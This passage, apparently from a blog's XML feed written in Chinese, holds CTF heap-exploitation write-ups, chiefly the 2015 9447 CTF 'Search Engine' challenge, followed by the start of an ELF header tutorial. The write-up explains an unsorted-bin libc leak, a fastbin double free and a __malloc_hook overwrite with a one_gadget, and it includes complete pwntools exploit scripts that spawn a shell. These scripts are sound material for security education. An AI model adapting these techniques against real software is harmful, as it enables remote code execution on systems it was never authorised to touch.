class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(fake_chunk), fake_chunk)</span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 6</span></span><br><span class="line">one_gadget_addr = libc + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Leak </tag>
            
            <tag> Malloc Hook </tag>
            
            <tag> Split Chunk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arbitrary Alloc 2015 9447 CTF:Search Engine</title>
      <link href="/2023/03/19/2015-9447-CTF-Search-Engine/"/>
      <url>/2023/03/19/2015-9447-CTF-Search-Engine/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec search </span><br><span class="line">[*] <span class="string">&#x27;/home/grxer/Desktop/pwn/heap/search&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>这道题静态分析起来挺复杂的，自定义的输入函数，各种阻力，最后配合gdb动态才搞明白</p><p>index_sentence()读取用户输入size长度的sentence，他还会用下面的结构把每个句子的单词分开构成一个单链表，单链表的content是从sentence地址上原数据地址，表头在0x6020B8，单链表表头是最后一个单词</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> word_struct     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> content         dq ?单词</span><br><span class="line"><span class="number">00000008</span> size            dd ?单词</span><br><span class="line"><span class="number">0000000</span>C padding1        dd ?</span><br><span class="line"><span class="number">00000010</span> sentence_ptr    dq ?句子                 ; offset</span><br><span class="line"><span class="number">00000018</span> len             dd ?整个句子</span><br><span class="line"><span class="number">0000001</span>C padding2        dd ?</span><br><span class="line"><span class="number">00000020</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> word_struct     ends</span><br></pre></td></tr></table></figure><p>这里由于空间复用其实heap manger给我们0x30大小chunk</p><p>search_word()读取一个输入长度比较<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(i-&gt;sentence_ptr, <span class="number">0</span>, i-&gt;len);</span><br><span class="line"><span class="built_in">free</span>(i-&gt;sentence_ptr);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Deleted!&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里找到之前把整个句子都给置零了，也没有free后置null，但是我们的struct地址都还在用，就从这里开始把</p><h2 id="unsorted-bin泄露libc"><a href="#unsorted-bin泄露libc" class="headerlink" title="unsorted bin泄露libc"></a>unsorted bin泄露libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">smallbin_sentence = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们这样会申请到三个堆，一个sentence两个word，‘ b’-&gt;‘a’*0x85，我们search(‘b’)，释放掉sentence堆，这个时候申请到的chunk大小0x90超过了fastbin，进入unsortbin，unsorted bin是个双向循环列表所以释放chunk的fd和bk会填上，unsortedbin的开始</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319221406963.png" alt="image-20230319221406963"></p><p>__由于释放后单链表还存在我们再次search,<code>if ( *i-&gt;sentence_ptr )</code>i-&gt;sentence_ptr是sentence chunk的fd指针被填上了unsorted bin绕过__，为了绕过<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code>，第一个我们的size还是1，由于memset(i-&gt;sentence_ptr, 0, i-&gt;len)会把整个句子置零，搜索0即可绕过,<code>fwrite(i-&gt;sentence_ptr, 1uLL, i-&gt;len, stdout);</code>会配合我们输出处bk和fd</p><p>unsorted bin地址距离main_arena,main_arena是glibc里的一个全局变量，偏移固定0x3C4B20，所以我们可以得到libc</p><h2 id="fastbin循环链表"><a href="#fastbin循环链表" class="headerlink" title="fastbin循环链表"></a>fastbin循环链表</h2><p>由于free后没有置零，我们可以doublefree，构成循环链表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><p>都free后a-&gt;b-&gt;c-&gt;0</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319234446142.png" alt="image-20230319234446142"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br></pre></td></tr></table></figure><p>再次free，这里的c是过不了if ( *i-&gt;sentence_ptr )检测的因为他是第一个释放的chunk，fastbin单链表只使用fd执行单向链接，所以她的fd为0</p><p>只需要将b释放这样b-&gt;fd指向a，且a的fd指向b，循环链表</p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319234527535.png" alt="image-20230319234527535" style="zoom:80%;"><h2 id="字节错位-Arbitrary-Alloc-and-malloc-hook"><a href="#字节错位-Arbitrary-Alloc-and-malloc-hook" class="headerlink" title="字节错位 Arbitrary Alloc and malloc hook"></a>字节错位 Arbitrary Alloc and malloc hook</h2><p>有了循环链表我们就可以伪造或者找一个fakechunk进行申请</p><p>有了main_arena地址后，我们想mallochook，malloc__hook在main_arean的上面是0x10字节处，</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000552113.png" alt="image-20230320000552113"></p><p>我们直接用find_fake_fast在上面利用字节错位找到一个chunk</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000725835.png" alt="image-20230320000725835"></p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000936214.png" alt="image-20230320000936214"></p><p>fakechunk偏移为main_arean的上面-0x33</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#<span class="meta">#<span class="keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>这里0x7f fastbin_index后为5，0x70的chunk，这里由于fastbin是分组的单链表，只有相同大小的freechunk才会构成单链表，所以我们需要在前面构成循环链表的大小为0x70，即申请0x60，同时我们需要在申请0x60大小申请到这个fakechunk</p><table><thead><tr><th>fastbinsY[]</th><th>x86（size_t&#x3D;4）</th><th>x64（size_t&#x3D;8）</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x20</td></tr><tr><td>1</td><td>0x18</td><td>0x30</td></tr><tr><td>2</td><td>0x20</td><td>0x40</td></tr><tr><td>3</td><td>0x28</td><td>0x50</td></tr><tr><td>4</td><td>0x30</td><td>0x60</td></tr><tr><td>5</td><td>0x38</td><td>0x70</td></tr><tr><td>6</td><td>0x40</td><td>0x80</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br></pre></td></tr></table></figure><p>这次会申请到b，这样我们可以控制b的fd指针为fakechunk</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320002318652.png" alt="image-20230320002318652"></p><p>再申请两次0x60大小chunk就可以申请到fakechunk</p><p>fakechunk距离malloc_hook0x23,我们是往fakechunk+0x10写数据，所以需要0x13大小padding</p><p>写入onegadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/Desktop&gt; one_gadget ./libc-2.23.so </span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br></pre></td></tr></table></figure><p>拿到shell,跑路喽</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320003959634.png" alt="image-20230320003959634"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./search&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_sentence</span>(<span class="params">s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the sentence size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(s)).encode())</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_word</span>(<span class="params">word</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the word size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(word)).encode())</span><br><span class="line">    io.send(word)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B41&#x27;)#judge</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B41&#x27;)# rcx</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BED&#x27;)</span></span><br><span class="line">smallbin_sentence = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">b&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Found 135: &#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Leak </tag>
            
            <tag> Byte misalignmen </tag>
            
            <tag> Double Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF File Parsing</title>
      <link href="/2023/03/19/23-2-21-elf/"/>
      <url>/2023/03/19/23-2-21-elf/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-File-Parsing"><a href="#ELF-File-Parsing" class="headerlink" title="ELF File Parsing"></a>ELF File Parsing</h1><p>​<strong>Executable and Linkable Format</strong></p><p>实验材料：010editor readelf objdump linux_ls文件(x86-64)</p><p>资料讲解32位elf，实验解析64位elf</p><p>ls文件信息</p><p>链接：<a href="https://pan.baidu.com/s/17ElUYwRhtW0eRRED4SgNDA">https://pan.baidu.com/s/17ElUYwRhtW0eRRED4SgNDA</a><br>提取码：ldss</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/test]</span><br><span class="line">└─$ checksec ./ls    </span><br><span class="line">[*] &#x27;/home/kali/Desktop/test/ls&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/test]</span><br><span class="line">└─$ file ./ls    </span><br><span class="line">./ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=15dfff3239aa7c3b16a71e6b2e3b6e4009dab998, for GNU/Linux 3.2.0, stripped</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/test]</span><br><span class="line">└─$ ldd ./ls               </span><br><span class="line">        linux-vdso.so.1 (0x00007ffcd2d86000)</span><br><span class="line">        libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ff70107a000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff700e99000)</span><br><span class="line">        libpcre2-8.so.0 =&gt; /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007ff700dff000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007ff7010e6000)</span><br></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th>长度</th><th>对齐方式</th><th>用途</th></tr></thead><tbody><tr><td>Elf32_Addr</td><td>4</td><td>4</td><td>无符号程序地址</td></tr><tr><td>Elf32_Half</td><td>2</td><td>2</td><td>无符号半整型</td></tr><tr><td>Elf32_Off</td><td>4</td><td>4</td><td>无符号文件偏移</td></tr><tr><td>Elf32_Sword</td><td>4</td><td>4</td><td>有符号大整型</td></tr><tr><td>Elf32_Word</td><td>4</td><td>4</td><td>无符号大整型</td></tr><tr><td>unsigned char</td><td>1</td><td>1</td><td>无符号小整型</td></tr></tbody></table><p><img src="/2023/03/19/23-2-21-elf/image-20230221233642860.png" alt="image-20230221233642860"></p><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><ul><li>ELF文件头表（ELF header）<ul><li>记录了ELF文件的组织结构</li></ul></li></ul><p>除了ELF头部表以外，其它部分都没有严格的顺序。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT   16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT]; <span class="comment">/* ELF文件标识 */</span></span><br><span class="line">    Elf32_Half      e_type;             <span class="comment">/* 文件类型 */</span></span><br><span class="line">    Elf32_Half      e_machine;          <span class="comment">/* 机器类型 */</span></span><br><span class="line">    Elf32_Word      e_version;          <span class="comment">/* 文件版本 */</span></span><br><span class="line">    Elf32_Addr      e_entry;            <span class="comment">/* 程序入口地址 */</span></span><br><span class="line">    Elf32_Off       e_phoff;            <span class="comment">/* 程序头表偏移 */</span></span><br><span class="line">    Elf32_Off       e_shoff;            <span class="comment">/* 节头表偏移 */</span></span><br><span class="line">    Elf32_Word      e_flags;            <span class="comment">/* 文件标志 */</span></span><br><span class="line">    Elf32_Half      e_ehsize;           <span class="comment">/* ELF头大小 */</span></span><br><span class="line">    Elf32_Half      e_phentsize;        <span class="comment">/* 程序头表项大小 */</span></span><br><span class="line">    Elf32_Half      e_phnum;            <span class="comment">/* 程序头表项数量 */</span></span><br><span class="line">    Elf32_Half      e_shentsize;        <span class="comment">/* 节头表项大小 */</span></span><br><span class="line">    Elf32_Half      e_shnum;            <span class="comment">/* 节头表项数量 */</span></span><br><span class="line">    Elf32_Half      e_shstrndx;         <span class="comment">/* 节头表字符串表索引 */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ readelf -h ./ls</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Position-Independent Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x61d0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          149360 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         13</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 30</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="e-dient"><a href="#e-dient" class="headerlink" title="e_dient"></a>e_dient</h3><ul><li>共16个字节</li><li>头4个字节，被称作 “魔数”，标识该文件是一个 ELF 目标文件。固定为<code>7f 45 4c 46</code>(.ELF)，和windows下PE(Portable Executable)文件的<code>4D 5A</code>(MZ)类似，改掉会崩溃</li><li>下一个字节标识文件的类型 <ul><li>0无效类型 </li><li>1 32文件 </li><li>2 64位文件</li></ul></li><li>下一个字节标识数据的编码方式<ul><li>0 无效</li><li>1 小端序 LSB</li><li>2 大端序 MSB</li></ul></li><li>后面字节不看了，因为除了.ELF签名，其他没有用,改掉后程序依旧可以正常运行，只是会迷惑掉解析软件罢了</li></ul><p><img src="/2023/03/19/23-2-21-elf/image-20230221231314941.png" alt="image-20230221231314941"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─$ readelf -h ./ls</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 0e ee ee ee ee ee ee ee ee ee ee ee </span><br><span class="line">  Class:                             &lt;unknown: e&gt;</span><br><span class="line">  Data:                              &lt;unknown: ee&gt;</span><br><span class="line">  Version:                           238 &lt;unknown&gt;</span><br><span class="line">  OS/ABI:                            &lt;unknown: ee&gt;</span><br><span class="line">  ABI Version:                       238</span><br><span class="line">  Type:                              DYN (Shared object file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x61d0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          64 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               18288 (bytes)</span><br><span class="line">  Size of program headers:           2 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           0 (bytes)</span><br><span class="line">  Number of section headers:         0</span><br><span class="line">  Section header string table index: 0</span><br><span class="line">readelf: Warning: possibly corrupt ELF file header - it has a non-zero section header offset, but no section headers</span><br></pre></td></tr></table></figure><h3 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h3><p>不能随意修改</p><table><thead><tr><th align="left">名称</th><th align="left">值</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">ET_NONE</td><td align="left">0</td><td align="left">无文件类型</td></tr><tr><td align="left">ET_REL</td><td align="left">1</td><td align="left">可重定位文件</td></tr><tr><td align="left">ET_EXEC</td><td align="left">2</td><td align="left">可执行文件</td></tr><tr><td align="left">ET_DYN</td><td align="left">3</td><td align="left">共享目标文件</td></tr><tr><td align="left">ET_CORE</td><td align="left">4</td><td align="left">核心转储文件</td></tr><tr><td align="left">ET_LOPROC</td><td align="left">0xff00</td><td align="left">处理器指定下限</td></tr><tr><td align="left">ET_HIPROC</td><td align="left">0xffff</td><td align="left">处理器指定上限</td></tr></tbody></table><p>这里ls头部信息中的类型竟然是共享库文件，而我们查看的是可执行文件，发现开启pie的程序都会被识别为3</p><p><code>PIE</code>能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为<code>ELF</code>共享对象。</p><h3 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h3><p>可运行的机器架构</p><p>不能随意修改</p><table><thead><tr><th align="left">名称</th><th align="left">值</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">EM_NONE</td><td align="left">0</td><td align="left">无机器类型</td></tr><tr><td align="left">EM_M32</td><td align="left">1</td><td align="left">AT&amp;T WE 32100</td></tr><tr><td align="left">EM_SPARC</td><td align="left">2</td><td align="left">SPARC</td></tr><tr><td align="left">EM_386</td><td align="left">3</td><td align="left">Intel 80386</td></tr><tr><td align="left">EM_68K</td><td align="left">4</td><td align="left">Motorola 68000</td></tr><tr><td align="left">EM_88K</td><td align="left">5</td><td align="left">Motorola 88000</td></tr><tr><td align="left">EM_860</td><td align="left">7</td><td align="left">Intel 80860</td></tr><tr><td align="left">EM_MIPS</td><td align="left">8</td><td align="left">MIPS RS3000</td></tr></tbody></table><h3 